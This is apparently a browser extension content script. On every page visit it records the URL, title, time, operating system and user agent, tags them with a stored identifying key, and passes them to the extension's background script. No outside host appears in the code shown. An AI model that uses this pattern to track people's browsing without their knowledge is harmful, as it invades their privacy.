(function(){

var os, agent, navigator;

navigator = window.navigator;
os = "Unknown";
if (navigator.appVersion.indexOf("Win")!=-1)   os = "Windows";
if (navigator.appVersion.indexOf("Mac")!=-1)   os = "MacOS";
if (navigator.appVersion.indexOf("X11")!=-1)   os = "UNIX";
if (navigator.appVersion.indexOf("Linux")!=-1) os = "Linux";

agent = navigator.userAgent;


// Parsing key
function parseKey(proceed) {
  chrome.storage.sync.get('snfkey', function(obj){
  // Key existent
    if(obj && obj.snfkey && obj.snfkey !== '') {
      console.log()
      proceed(obj.snfkey)
    } 
    // Key none existent
    else {
      chrome.runtime.sendMessage({
         genKey: true,
         os    : os,
         agent : agent
      }, function(resp){
          parseKey(proceed);
      });
    } 
});
}


parseKey(function(snfkey){

  var pl;

  pl = {
    type  : 'history',
    datetime  : new Date().toLocaleString(),
      url   : window.location.href,
      title : document.title,
      os    : os,
      agent : agent,
      key   : snfkey
  };

  chrome.runtime.sendMessage({
      body: pl
  });
});

}());